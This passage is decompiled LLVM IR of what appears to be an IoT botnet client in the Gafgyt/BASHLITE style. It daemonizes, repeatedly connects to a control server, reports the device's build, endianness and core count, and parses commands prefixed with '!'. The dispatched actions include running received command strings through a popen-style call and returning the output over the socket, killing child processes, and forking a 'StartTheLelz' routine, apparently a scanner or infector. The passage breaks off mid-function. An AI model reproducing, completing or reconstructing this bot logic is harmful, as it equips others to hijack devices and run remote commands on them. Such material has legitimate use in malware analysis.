  %v0_10007684 = call i32 @getCoresAmount()
  %v1_1000769c = inttoptr i32 %v1_10007674 to i8*
  %v1_100076a0 = inttoptr i32 %v0_1000767c to i8*
  %v16_100076b4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_1000e38c.135, i32 0, i32 0), i8* bitcast (i8** @global_var_1000e3bc.136 to i8*), i8* %v1_1000769c, i8* %v1_100076a0, i32 %v0_10007684, i8* bitcast (i8** @global_var_1000e3c4.137 to i8*))
  store i32 268465852, i32* @lr, align 4
  %v0_100076b8 = call i32 @__libc_fork()
  %v3_100076c8 = icmp eq i32 %v0_100076b8, 0
  br i1 %v3_100076c8, label %dec_label_pc_100076f8, label %dec_label_pc_100076ec

dec_label_pc_100076ec:                            ; preds = %dec_label_pc_10007674
  %v2_100076d0 = ptrtoint i32* %stack_var_-5256 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_100076e4.139 to i32), i32* @lr, align 4
  %v3_100076e0 = call i32 @__libc_waitpid(i32 %v0_100076b8, i32 %v2_100076d0, i32 0)
  %v0_100076e8 = call i32 @__GI_exit()
  br label %dec_label_pc_10007718

dec_label_pc_100076f8:                            ; preds = %dec_label_pc_10007674
  store i32 268465916, i32* @lr, align 4
  %v0_100076f8 = call i32 @__libc_fork()
  %v3_10007708 = icmp eq i32 %v0_100076f8, 0
  br i1 %v3_10007708, label %dec_label_pc_10007718, label %dec_label_pc_10007710

dec_label_pc_10007710:                            ; preds = %dec_label_pc_100076f8
  %v0_10007714 = call i32 @__GI_exit()
  br label %dec_label_pc_10007718

dec_label_pc_10007718:                            ; preds = %dec_label_pc_100076ec, %dec_label_pc_100076f8, %dec_label_pc_10007710
  store i32 268465948, i32* @lr, align 4
  %v0_10007718 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_10007728.142 to i32), i32* @lr, align 4
  %v2_10007724 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1000e3cc.141 to i32), i32 268500992)
  store i32 ptrtoint (i32* @global_var_10007734.143 to i32), i32* @lr, align 4
  %v2_10007730 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_10008118 = ptrtoint i32* %stack_var_-4188 to i32
  %v4_10008128 = bitcast i32* %stack_var_-4188 to i8*
  %v2_10007a9c = ptrtoint i32* %stack_var_-5320 to i32
  %v3_10007ae0 = icmp eq i32 %argc, 2
  %v1_10007b0c = add i32 %tmp, 4
  %v1_10007b10 = inttoptr i32 %v1_10007b0c to i32*
  %v1_10007d1c = or i32 %v2_10008118, 1
  %v2_10007eb0 = ptrtoint i32* %stack_var_-5212 to i32
  %v2_100080e0 = add i32 %v2_10007a9c, 68
  br label %dec_label_pc_10007738

dec_label_pc_10007738:                            ; preds = %dec_label_pc_10007748, %dec_label_pc_10008110, %dec_label_pc_10007718
  %v0_10007738 = call i32 @initConnection()
  %v3_10007740 = icmp eq i32 %v0_10007738, 0
  br i1 %v3_10007740, label %dec_label_pc_10007774, label %dec_label_pc_10007748

dec_label_pc_10007748:                            ; preds = %dec_label_pc_10007738
  %v9_10007764 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_1000e3d0.144, i32 0, i32 0), i8* bitcast (i8** @global_var_1000e3bc.136 to i8*), i8* bitcast (i8** @global_var_1000e3c4.137 to i8*))
  store i32 268466032, i32* @lr, align 4
  %v1_1000776c = call i32 @sleep(i32 5)
  br label %dec_label_pc_10007738

dec_label_pc_10007774:                            ; preds = %dec_label_pc_10007738
  %v3_10007778 = load i32, i32* @global_var_1001fd98.37, align 4
  %v1_1000777c = call i32 @getBuild(i32 ptrtoint (i32* @global_var_10020000.2 to i32))
  %v0_10007784 = call i32 @getEndianness()
  store i32 268466064, i32* @lr, align 4
  %v0_1000778c = call i32 @getCoresAmount()
  store i32 ptrtoint (i32* @global_var_100077b4.147 to i32), i32* @lr, align 4
  %v7_100077b0 = call i32 @sockprintf(i32 %v3_10007778, i32 ptrtoint ([17 x i8]* @global_var_1000e3f8.146 to i32), i32 %v1_1000777c)
  br label %dec_label_pc_10008110

dec_label_pc_100077d4:                            ; preds = %dec_label_pc_10007a88, %dec_label_pc_10007a2c
  %v1_100077d8 = mul i32 %storemerge13, 4
  %v3_100077e4 = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_100077e8 = add i32 %v3_100077e4, %v1_100077d8
  %v1_100077ec = inttoptr i32 %v2_100077e8 to i32*
  %v2_100077ec = load i32, i32* %v1_100077ec, align 4
  store i32 268466176, i32* @lr, align 4
  %v3_100077fc = call i32 @__libc_waitpid(i32 %v2_100077ec, i32 0, i32 1)
  %tmp101 = icmp slt i32 %v3_100077fc, 1
  br i1 %tmp101, label %dec_label_pc_10007a20, label %dec_label_pc_10007864

dec_label_pc_1000781c:                            ; preds = %dec_label_pc_10007864, %dec_label_pc_100078ac
  %v1_10007820 = mul i32 %v1_10007810, 4
  %v3_1000782c = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_10007830 = add i32 %v3_1000782c, %v1_10007820
  %v1_10007834 = add i32 %v2_10007830, -4
  %v1_10007850 = inttoptr i32 %v2_10007830 to i32*
  %v2_10007850 = load i32, i32* %v1_10007850, align 4
  %v2_10007854 = inttoptr i32 %v1_10007834 to i32*
  store i32 %v2_10007850, i32* %v2_10007854, align 4
  br label %dec_label_pc_10007864

dec_label_pc_10007864:                            ; preds = %dec_label_pc_100077d4, %dec_label_pc_1000781c
  %storemerge19 = phi i32 [ %v1_10007810, %dec_label_pc_1000781c ], [ %storemerge13, %dec_label_pc_100077d4 ]
  %v1_10007810 = add i32 %storemerge19, 1
  %v2_1000788c = load i32, i32* @global_var_1001fda0.42, align 4
  %v3_100078a4 = icmp eq i32 %v2_1000788c, 0
  br i1 %v3_100078a4, label %dec_label_pc_100078ac, label %dec_label_pc_1000781c

dec_label_pc_100078ac:                            ; preds = %dec_label_pc_10007864
  %v3_10007890 = load i32, i32* @global_var_1001fda4.43, align 4
  %v3_100078c4 = icmp ugt i32 %v3_10007890, %v1_10007810
  br i1 %v3_100078c4, label %dec_label_pc_1000781c, label %dec_label_pc_100078cc

dec_label_pc_100078cc:                            ; preds = %dec_label_pc_100078ac
  %v1_100078d0 = mul i32 %v1_10007810, 4
  %v3_100078dc = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_100078e0 = add i32 %v1_100078d0, -4
  %v1_100078e4 = add i32 %v2_100078e0, %v3_100078dc
  %v2_100078ec = inttoptr i32 %v1_100078e4 to i32*
  store i32 0, i32* %v2_100078ec, align 4
  %v3_100078f8 = load i32, i32* @global_var_1001fda4.43, align 4
  %v2_100078fc = load i32, i32* @global_var_1001fda0.42, align 4
  %v1_10007900 = add i32 %v3_100078f8, -1
  %v2_10007900 = icmp ne i32 %v3_100078f8, 0
  %v2_10007904 = zext i1 %v2_10007900 to i32
  %v3_10007904 = add i32 %v2_100078fc, -1
  %v4_10007904 = add i32 %v3_10007904, %v2_10007904
  store i32 %v4_10007904, i32* @global_var_1001fda0.42, align 4
  store i32 %v1_10007900, i32* @global_var_1001fda4.43, align 4
  %v1_10007934 = mul i32 %v1_10007900, 4
  %v1_1000793c = add i32 %v1_10007934, 4
  store i32 268466504, i32* @lr, align 4
  %v1_10007944 = call i32 @malloc(i32 %v1_1000793c)
  br label %dec_label_pc_1000799c

dec_label_pc_1000795c:                            ; preds = %dec_label_pc_1000799c, %dec_label_pc_100079e4
  %v1_10007960 = mul i32 %storemerge18, 4
  %v2_1000796c = add i32 %v1_10007960, %v1_10007944
  %v3_10007980 = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_10007984 = add i32 %v3_10007980, %v1_10007960
  %v1_10007988 = inttoptr i32 %v2_10007984 to i32*
  %v2_10007988 = load i32, i32* %v1_10007988, align 4
  %v2_1000798c = inttoptr i32 %v2_1000796c to i32*
  store i32 %v2_10007988, i32* %v2_1000798c, align 4
  %v1_10007994 = add i32 %storemerge18, 1
  br label %dec_label_pc_1000799c

dec_label_pc_1000799c:                            ; preds = %dec_label_pc_100078cc, %dec_label_pc_1000795c
  %storemerge18 = phi i32 [ 0, %dec_label_pc_100078cc ], [ %v1_10007994, %dec_label_pc_1000795c ]
  %v2_100079c4 = load i32, i32* @global_var_1001fda0.42, align 4
  %v3_100079dc = icmp eq i32 %v2_100079c4, 0
  br i1 %v3_100079dc, label %dec_label_pc_100079e4, label %dec_label_pc_1000795c

dec_label_pc_100079e4:                            ; preds = %dec_label_pc_1000799c
  %v3_100079c8 = load i32, i32* @global_var_1001fda4.43, align 4
  %v3_100079fc = icmp ugt i32 %v3_100079c8, %storemerge18
  br i1 %v3_100079fc, label %dec_label_pc_1000795c, label %dec_label_pc_10007a04

dec_label_pc_10007a04:                            ; preds = %dec_label_pc_100079e4
  %v3_10007a08 = load i32, i32* @global_var_1001fdc0.44, align 4
  store i32 268466708, i32* @lr, align 4
  %v1_10007a10 = call i32 @free(i32 %v3_10007a08)
  store i32 %v1_10007944, i32* @global_var_1001fdc0.44, align 4
  br label %dec_label_pc_10007a20

dec_label_pc_10007a20:                            ; preds = %dec_label_pc_100077d4, %dec_label_pc_10007a04
  %v1_10007a24 = add i32 %storemerge13, 1
  br label %dec_label_pc_10007a2c

dec_label_pc_10007a2c:                            ; preds = %dec_label_pc_10008110, %dec_label_pc_10007a20
  %storemerge13 = phi i32 [ %v1_10007a24, %dec_label_pc_10007a20 ], [ 0, %dec_label_pc_10008110 ]
  %tmp103 = icmp slt i32 %storemerge13, 0
  %v1_10007a30 = zext i1 %tmp103 to i32
  %v2_10007a30 = ashr i32 %storemerge13, 31
  %v3_10007a30 = and i32 %v2_10007a30, -2
  %v4_10007a30 = or i32 %v3_10007a30, %v1_10007a30
  %v2_10007a58 = load i32, i32* @global_var_1001fda0.42, align 4
  %v3_10007a5c = load i32, i32* @global_var_1001fda4.43, align 4
  %v3_10007a70 = icmp ugt i32 %v2_10007a58, %v4_10007a30
  br i1 %v3_10007a70, label %dec_label_pc_100077d4, label %dec_label_pc_10007a78

dec_label_pc_10007a78:                            ; preds = %dec_label_pc_10007a2c
  %v4_10007a70 = icmp eq i32 %v2_10007a58, %v4_10007a30
  br i1 %v4_10007a70, label %dec_label_pc_10007a88, label %dec_label_pc_10007a98

dec_label_pc_10007a88:                            ; preds = %dec_label_pc_10007a78
  %v3_10007a90 = icmp ugt i32 %v3_10007a5c, %storemerge13
  br i1 %v3_10007a90, label %dec_label_pc_100077d4, label %dec_label_pc_10007a98

dec_label_pc_10007a98:                            ; preds = %dec_label_pc_10007a78, %dec_label_pc_10007a88
  %v2_10007aa0 = add i32 %v5_10008128, %v2_10007a9c
  %v3_10007aa8 = add i32 %v2_10007aa0, 1132
  %v4_10007aa8 = inttoptr i32 %v3_10007aa8 to i8*
  store i8 0, i8* %v4_10007aa8, align 1
  %v1_10007ab4 = call i32 @trim(i32 %v2_10008118)
  %v2_10007abc = load i32, i32* %v1_100075cc, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e40c.148 to i32), i32* @r4, align 4
  %v4_10007acc = inttoptr i32 %v2_10007abc to i8*
  %v5_10007acc = call i32 @__GI_strcoll(i8* %v4_10007acc, i32 ptrtoint ([8 x i8]* @global_var_1000e40c.148 to i32), i32 268500992)
  %v3_10007ad4 = icmp eq i32 %v5_10007acc, 0
  br i1 %v3_10007ad4, label %dec_label_pc_10007adc, label %dec_label_pc_10007c28

dec_label_pc_10007adc:                            ; preds = %dec_label_pc_10007a98
  br i1 %v3_10007ae0, label %dec_label_pc_10007b08, label %dec_label_pc_10007ae8

dec_label_pc_10007ae8:                            ; preds = %dec_label_pc_10007adc
  %v3_10007aec = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint (i32* @global_var_10007b04.150 to i32), i32* @lr, align 4
  %v4_10007b00 = call i32 @sockprintf(i32 %v3_10007aec, i32 ptrtoint ([17 x i8]* @global_var_1000e414.149 to i32), i32 268500992)
  br label %dec_label_pc_10008148

dec_label_pc_10007b08:                            ; preds = %dec_label_pc_10007adc
  %v2_10007b10 = load i32, i32* %v1_10007b10, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000e428.151 to i32), i32* @r4, align 4
  %v4_10007b20 = inttoptr i32 %v2_10007b10 to i8*
  %v5_10007b20 = call i32 @__GI_strcoll(i8* %v4_10007b20, i32 ptrtoint ([4 x i8]* @global_var_1000e428.151 to i32), i32 268500992)
  %v3_10007b28 = icmp eq i32 %v5_10007b20, 0
  br i1 %v3_10007b28, label %dec_label_pc_10007b30, label %dec_label_pc_10007b7c

dec_label_pc_10007b30:                            ; preds = %dec_label_pc_10007b08
  %v3_10007b34 = load i32, i32* @global_var_1001fdbc.152, align 4
  %v3_10007b38 = icmp eq i32 %v3_10007b34, 0
  br i1 %v3_10007b38, label %dec_label_pc_10008148, label %dec_label_pc_10007b40

dec_label_pc_10007b40:                            ; preds = %dec_label_pc_10007b30
  %v3_10007b44 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 268467036, i32* @lr, align 4
  %v4_10007b58 = call i32 @sockprintf(i32 %v3_10007b44, i32 ptrtoint ([17 x i8]* @global_var_1000e42c.153 to i32), i32 268500992)
  %v3_10007b60 = load i32, i32* @global_var_1001fdbc.152, align 4
  store i32 268467056, i32* @lr, align 4
  %v2_10007b6c = call i32 @kill(i32 %v3_10007b60, i32 9)
  store i32 0, i32* @global_var_1001fdbc.152, align 4
  br label %dec_label_pc_10007b7c

dec_label_pc_10007b7c:                            ; preds = %dec_label_pc_10007b08, %dec_label_pc_10007b40
  %v2_10007b84 = load i32, i32* %v1_10007b10, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000e440.154 to i32), i32* @r4, align 4
  %v4_10007b94 = inttoptr i32 %v2_10007b84 to i8*
  %v5_10007b94 = call i32 @__GI_strcoll(i8* %v4_10007b94, i32 ptrtoint ([3 x i8]* @global_var_1000e440.154 to i32), i32 268500992)
  %v3_10007b9c = icmp eq i32 %v5_10007b94, 0
  br i1 %v3_10007b9c, label %dec_label_pc_10007ba4, label %dec_label_pc_10007c28

dec_label_pc_10007ba4:                            ; preds = %dec_label_pc_10007b7c
  %v3_10007ba8 = load i32, i32* @global_var_1001fdbc.152, align 4
  %v3_10007bac = icmp eq i32 %v3_10007ba8, 0
  br i1 %v3_10007bac, label %dec_label_pc_10007bb4, label %dec_label_pc_10008148

dec_label_pc_10007bb4:                            ; preds = %dec_label_pc_10007ba4
  store i32 268467128, i32* @lr, align 4
  %v0_10007bb4 = call i32 @__libc_fork()
  store i32 268467148, i32* @lr, align 4
  %v3_10007bc8 = call i32 @puts(i32 ptrtoint ([28 x i8]* @global_var_1000e444.155 to i32), i32 268500992)
  %v3_10007bd0 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 268467176, i32* @lr, align 4
  %v4_10007be4 = call i32 @sockprintf(i32 %v3_10007bd0, i32 ptrtoint ([17 x i8]* @global_var_1000e460.156 to i32), i32 268500992)
  %v3_10007bec = icmp eq i32 %v0_10007bb4, 0
  br i1 %v3_10007bec, label %dec_label_pc_10007c04, label %dec_label_pc_10007bf4

dec_label_pc_10007bf4:                            ; preds = %dec_label_pc_10007bb4
  store i32 %v0_10007bb4, i32* @global_var_1001fdbc.152, align 4
  br label %dec_label_pc_10008148

dec_label_pc_10007c04:                            ; preds = %dec_label_pc_10007bb4
  %v2_10007c1c = call i32 @StartTheLelz(i32 1, i32 -1)
  %v1_10007c24 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10007c28

dec_label_pc_10007c28:                            ; preds = %dec_label_pc_10007b7c, %dec_label_pc_10007a98, %dec_label_pc_10007c04
  store i32 268467260, i32* @lr, align 4
  %v5_10007c38 = call i32 @strstr(i32 %v2_10008118, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000e27c.38, i32 0, i32 0), i32 268500992)
  %v4_10007c44 = icmp eq i32 %v5_10007c38, %v2_10008118
  br i1 %v4_10007c44, label %dec_label_pc_10007c4c, label %dec_label_pc_10007c6c

dec_label_pc_10007c4c:                            ; preds = %dec_label_pc_10007c28
  %v3_10007c50 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint (i32* @global_var_10007c68.159 to i32), i32* @lr, align 4
  %v4_10007c64 = call i32 @sockprintf(i32 %v3_10007c50, i32 ptrtoint ([5 x i8]* @global_var_1000e474.158 to i32), i32 268500992)
  br label %dec_label_pc_10008110

dec_label_pc_10007c6c:                            ; preds = %dec_label_pc_10007c28
  store i32 268467328, i32* @lr, align 4
  %v5_10007c7c = call i32 @strstr(i32 %v2_10008118, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000e47c.160, i32 0, i32 0), i32 268500992)
  %v4_10007c88 = icmp eq i32 %v5_10007c7c, %v2_10008118
  br i1 %v4_10007c88, label %dec_label_pc_10007c90, label %dec_label_pc_10007c98

dec_label_pc_10007c90:                            ; preds = %dec_label_pc_10007c6c
  %v0_10007c94 = call i32 @__GI_exit()
  br label %dec_label_pc_10007c98

dec_label_pc_10007c98:                            ; preds = %dec_label_pc_10007c6c, %dec_label_pc_10007c90
  %v2_10007ca4 = load i8, i8* %v4_10008128, align 4
  %v3_10007cac = icmp eq i8 %v2_10007ca4, 33
  br i1 %v3_10007cac, label %dec_label_pc_10007cd0, label %dec_label_pc_10008110

dec_label_pc_10007cd0:                            ; preds = %dec_label_pc_10007c98, %dec_label_pc_10007ce4
  %storemerge = phi i32 [ %v1_10007cb8, %dec_label_pc_10007ce4 ], [ %v2_10008118, %dec_label_pc_10007c98 ]
  %v1_10007cb8 = add i32 %storemerge, 1
  %storemerge7 = inttoptr i32 %v1_10007cb8 to i8*
  %v2_10007cd4 = load i8, i8* %storemerge7, align 1
  %v3_10007cdc = icmp eq i8 %v2_10007cd4, 32
  br i1 %v3_10007cdc, label %dec_label_pc_10007cf8, label %dec_label_pc_10007ce4

dec_label_pc_10007ce4:                            ; preds = %dec_label_pc_10007cd0
  %v2_10007ce8 = load i8, i8* %storemerge7, align 1
  %v3_10007cf0 = icmp eq i8 %v2_10007ce8, 0
  br i1 %v3_10007cf0, label %dec_label_pc_10007cf8, label %dec_label_pc_10007cd0

dec_label_pc_10007cf8:                            ; preds = %dec_label_pc_10007ce4, %dec_label_pc_10007cd0
  %v2_10007cfc = load i8, i8* %storemerge7, align 1
  %v3_10007d04 = icmp eq i8 %v2_10007cfc, 0
  br i1 %v3_10007d04, label %dec_label_pc_10008110, label %dec_label_pc_10007d0c

dec_label_pc_10007d0c:                            ; preds = %dec_label_pc_10007cf8
  store i8 0, i8* %storemerge7, align 1
  store i32 %v1_10007d1c, i32* @r3, align 4
  %v0_10007d2c = call i32 @__GI_strlen()
  %v2_10007d3c = add i32 %v0_10007d2c, %v2_10008118
  %v1_10007d40 = add i32 %v2_10007d3c, 2
  %v2_10007d8c = add i32 %v2_10007d3c, 1
  br label %dec_label_pc_10007d74

dec_label_pc_10007d4c:                            ; preds = %dec_label_pc_10007da4, %dec_label_pc_10007d74
  store i32 %v1_10007d40, i32* @r3, align 4
  %v0_10007d54 = call i32 @__GI_strlen()
  %v1_10007d68 = add i32 %v0_10007d54, %v2_10007d8c
  %v3_10007d70 = inttoptr i32 %v1_10007d68 to i8*
  store i8 0, i8* %v3_10007d70, align 1
  br label %dec_label_pc_10007d74

dec_label_pc_10007d74:                            ; preds = %dec_label_pc_10007d0c, %dec_label_pc_10007d4c
  store i32 %v1_10007d40, i32* @r3, align 4
  %v0_10007d7c = call i32 @__GI_strlen()
  %v1_10007d90 = add i32 %v0_10007d7c, %v2_10007d8c
  %v1_10007d94 = inttoptr i32 %v1_10007d90 to i8*
  %v2_10007d94 = load i8, i8* %v1_10007d94, align 1
  %v3_10007d9c = icmp eq i8 %v2_10007d94, 10
  br i1 %v3_10007d9c, label %dec_label_pc_10007d4c, label %dec_label_pc_10007da4

dec_label_pc_10007da4:                            ; preds = %dec_label_pc_10007d74
  store i32 %v1_10007d40, i32* @r3, align 4
  %v0_10007dac = call i32 @__GI_strlen()
  %v1_10007dc0 = add i32 %v0_10007dac, %v2_10007d8c
  %v1_10007dc4 = inttoptr i32 %v1_10007dc0 to i8*
  %v2_10007dc4 = load i8, i8* %v1_10007dc4, align 1
  %v3_10007dcc = icmp eq i8 %v2_10007dc4, 13
  br i1 %v3_10007dcc, label %dec_label_pc_10007d4c, label %dec_label_pc_10007dec.preheader

dec_label_pc_10007dec.preheader:                  ; preds = %dec_label_pc_10007da4
  %stack_var_-5280.021 = inttoptr i32 %v1_10007d40 to i8*
  %v2_10007df022 = load i8, i8* %stack_var_-5280.021, align 1
  %v3_10007df826 = icmp eq i8 %v2_10007df022, 32
  br i1 %v3_10007df826, label %dec_label_pc_10007e14, label %dec_label_pc_10007e00

dec_label_pc_10007de0:                            ; preds = %dec_label_pc_10007e00
  %v1_10007de4 = add i32 %storemerge2027, 1
  %stack_var_-5280.0 = inttoptr i32 %v1_10007de4 to i8*
  %v2_10007df0 = load i8, i8* %stack_var_-5280.0, align 1
  %v3_10007df8 = icmp eq i8 %v2_10007df0, 32
  br i1 %v3_10007df8, label %dec_label_pc_10007e14, label %dec_label_pc_10007e00

dec_label_pc_10007e00:                            ; preds = %dec_label_pc_10007dec.preheader, %dec_label_pc_10007de0
  %stack_var_-5280.028 = phi i8* [ %stack_var_-5280.0, %dec_label_pc_10007de0 ], [ %stack_var_-5280.021, %dec_label_pc_10007dec.preheader ]
  %storemerge2027 = phi i32 [ %v1_10007de4, %dec_label_pc_10007de0 ], [ %v1_10007d40, %dec_label_pc_10007dec.preheader ]
  %v2_10007e04 = load i8, i8* %stack_var_-5280.028, align 1
  %v3_10007e0c = icmp eq i8 %v2_10007e04, 0
  br i1 %v3_10007e0c, label %dec_label_pc_10007e14, label %dec_label_pc_10007de0

dec_label_pc_10007e14:                            ; preds = %dec_label_pc_10007de0, %dec_label_pc_10007e00, %dec_label_pc_10007dec.preheader
  %storemerge20.lcssa = phi i32 [ %v1_10007d40, %dec_label_pc_10007dec.preheader ], [ %v1_10007de4, %dec_label_pc_10007de0 ], [ %storemerge2027, %dec_label_pc_10007e00 ]
  %stack_var_-5280.0.lcssa = phi i8* [ %stack_var_-5280.021, %dec_label_pc_10007dec.preheader ], [ %stack_var_-5280.0, %dec_label_pc_10007de0 ], [ %stack_var_-5280.028, %dec_label_pc_10007e00 ]
  store i8 0, i8* %stack_var_-5280.0.lcssa, align 1
  %v1_10007e24 = add i32 %storemerge20.lcssa, 1
  %v2_10007e7033 = load i8, i8* %stack_var_-5280.021, align 1
  %v3_10007e7836 = icmp eq i8 %v2_10007e7033, 0
  br i1 %v3_10007e7836, label %dec_label_pc_10007e80, label %dec_label_pc_10007e38

dec_label_pc_10007e38:                            ; preds = %dec_label_pc_10007e14, %dec_label_pc_10007e38
  %storemerge638 = phi i8* [ %storemerge6, %dec_label_pc_10007e38 ], [ %stack_var_-5280.021, %dec_label_pc_10007e14 ]
  %storemerge1537 = phi i32 [ %v1_10007e64, %dec_label_pc_10007e38 ], [ %v1_10007d40, %dec_label_pc_10007e14 ]
  %v3_10007e3c = load i8, i8* %storemerge638, align 1
  %v4_10007e3c = zext i8 %v3_10007e3c to i32
  store i32 268467792, i32* @lr, align 4
  %v3_10007e4c = call i32 @__GI_toupper(i32 %v4_10007e3c, i32 %storemerge1537)
  %v1_10007e5c = trunc i32 %v3_10007e4c to i8
  store i8 %v1_10007e5c, i8* %storemerge638, align 1
  %v1_10007e64 = add i32 %storemerge1537, 1
  %storemerge6 = inttoptr i32 %v1_10007e64 to i8*
  %v2_10007e70 = load i8, i8* %storemerge6, align 1
  %v3_10007e78 = icmp eq i8 %v2_10007e70, 0
  br i1 %v3_10007e78, label %dec_label_pc_10007e80, label %dec_label_pc_10007e38

dec_label_pc_10007e80:                            ; preds = %dec_label_pc_10007e38, %dec_label_pc_10007e14
  store i32 ptrtoint ([3 x i8]* @global_var_1000e480.161 to i32), i32* @r4, align 4
  %v5_10007e90 = call i32 @__GI_strcoll(i8* %stack_var_-5280.021, i32 ptrtoint ([3 x i8]* @global_var_1000e480.161 to i32), i32 268500992)
  %v3_10007e98 = icmp eq i32 %v5_10007e90, 0
  br i1 %v3_10007e98, label %dec_label_pc_10007ea0, label %dec_label_pc_10007f8c

dec_label_pc_10007ea0:                            ; preds = %dec_label_pc_10007e80
  store i32 268467876, i32* @lr, align 4
  %v0_10007ea0 = call i32 @listFork()
  %v3_10007ea8 = icmp eq i32 %v0_10007ea0, 0
  br i1 %v3_10007ea8, label %dec_label_pc_10007eb0, label %dec_label_pc_10008110

dec_label_pc_10007eb0:                            ; preds = %dec_label_pc_10007ea0
  store i32 268467912, i32* @lr, align 4
  %v3_10007ec4 = call i32 @__GI_memset(i32 %v2_10007eb0, i32 0, i32 1024)
  %v4_10007ee4 = call i32 @szprintf(i32 %v2_10007eb0, i32 ptrtoint ([8 x i8]* @global_var_1000e484.162 to i32), i32 %v1_10007e24)
  store i32 268467968, i32* @lr, align 4
  %v3_10007efc = call i32 @fdpopen(i32 %v2_10007eb0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1000e48c.163, i32 0, i32 0))
  br label %dec_label_pc_10007f5c

dec_label_pc_10007f0c:                            ; preds = %dec_label_pc_10007f5c
  %v1_10007f14 = call i32 @trim(i32 %v2_10007eb0)
  %v3_10007f1c = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 268468028, i32* @lr, align 4
  %v5_10007f38 = call i32 @sockprintf(i32 %v3_10007f1c, i32 ptrtoint ([3 x i8]* @global_var_1000e490.164 to i32), i32 %v2_10007eb0)
  store i32 ptrtoint ([3 x i8]* @global_var_10007f54.165 to i32), i32* @lr, align 4
  %v3_10007f50 = call i32 @__GI_memset(i32 %v2_10007eb0, i32 0, i32 1024)
  store i32 268468060, i32* @lr, align 4
  %v1_10007f58 = call i32 @sleep(i32 1)
  br label %dec_label_pc_10007f5c

dec_label_pc_10007f5c:                            ; preds = %dec_label_pc_10007eb0, %dec_label_pc_10007f0c
  %v3_10007f6c = call i32 @fdgets(i32 %v2_10007eb0, i32 1024, i32 %v3_10007efc)
  %v3_10007f74 = icmp eq i32 %v3_10007f6c, 0
  br i1 %v3_10007f74, label %dec_label_pc_10007f7c, label %dec_label_pc_10007f0c

dec_label_pc_10007f7c:                            ; preds = %dec_label_pc_10007f5c
  %v1_10007f80 = call i32 @fdpclose(i32 %v3_10007efc)
  %v0_10007f88 = call i32 @__GI_exit()
  br label %dec_label_pc_10007f8c

dec_label_pc_10007f8c:                            ; preds = %dec_label_pc_10007e80, %dec_label_pc_10007f7c
  store i32 ptrtoint (i32* @global_var_1000e494.168 to i32), i32* @r4, align 4
  store i32 268468136, i32* @lr, align 4
  %v3_10007fa4 = call i32 @__GI_strtok(i32 %v1_10007e24, i32 ptrtoint (i32* @global_var_1000e494.168 to i32), i32 268500992)
  store i32 %v1_10007d40, i32* %stack_var_-5252, align 4
  %v3_1000809c42 = icmp eq i32 %v3_10007fa4, 0
  br i1 %v3_1000809c42, label %dec_label_pc_100080a4, label %dec_label_pc_10007fbc

dec_label_pc_10007fbc:                            ; preds = %dec_label_pc_10007f8c, %dec_label_pc_10008080
  %stack_var_-5312.045.in = phi i32 [ %v3_1000808c, %dec_label_pc_10008080 ], [ %v3_10007fa4, %dec_label_pc_10007f8c ]
  %stack_var_-5308.143 = phi i32 [ %stack_var_-5308.0, %dec_label_pc_10008080 ], [ 1, %dec_label_pc_10007f8c ]
  %stack_var_-5312.045 = inttoptr i32 %stack_var_-5312.045.in to i8*
  %v2_10007fc0 = load i8, i8* %stack_var_-5312.045, align 1
  %v3_10007fc8 = icmp eq i8 %v2_10007fc0, 10
  br i1 %v3_10007fc8, label %dec_label_pc_10008080, label %dec_label_pc_10007fd0

dec_label_pc_10007fd0:                            ; preds = %dec_label_pc_10007fbc
  store i32 %stack_var_-5308.143, i32* @r29, align 4
  store i32 %stack_var_-5312.045.in, i32* @r3, align 4
  %v0_10007fdc = call i32 @__GI_strlen()
  %v1_10007fe4 = add i32 %v0_10007fdc, 1
  store i32 268468208, i32* @lr, align 4
  %v1_10007fec = call i32 @malloc(i32 %v1_10007fe4)
  %v0_10007ff8 = load i32, i32* @r29, align 4
  %v1_10007ff8 = mul i32 %v0_10007ff8, 4
  %v1_10008004 = add i32 %v1_10007ff8, %v2_100080e0
  %v2_10008008 = inttoptr i32 %v1_10008004 to i32*
  store i32 %v1_10007fec, i32* %v2_10008008, align 4
  %v1_10008010 = mul i32 %stack_var_-5308.143, 4
  %v1_1000801c = add i32 %v1_10008010, %v2_100080e0
  %v1_10008020 = inttoptr i32 %v1_1000801c to i32*
  %v2_10008020 = load i32, i32* %v1_10008020, align 4
  store i32 %stack_var_-5312.045.in, i32* @r3, align 4
  %v0_1000802c = call i32 @__GI_strlen()
  %v1_10008034 = add i32 %v0_1000802c, 1
  store i32 268468300, i32* @lr, align 4
  %v3_10008048 = call i32 @__GI_memset(i32 %v2_10008020, i32 0, i32 %v1_10008034)
  %v2_10008060 = load i32, i32* %v1_10008020, align 4
  %v4_10008070 = call i32 @strcpy(i32 %v2_10008060, i8* nonnull %stack_var_-5312.045)
  %v1_10008078 = add i32 %stack_var_-5308.143, 1
  br label %dec_label_pc_10008080

dec_label_pc_10008080:                            ; preds = %dec_label_pc_10007fbc, %dec_label_pc_10007fd0
  %stack_var_-5308.0 = phi i32 [ %stack_var_-5308.143, %dec_label_pc_10007fbc ], [ %v1_10008078, %dec_label_pc_10007fd0 ]
  store i32 ptrtoint (i32* @global_var_1000e494.168 to i32), i32* @r4, align 4
  store i32 268468368, i32* @lr, align 4
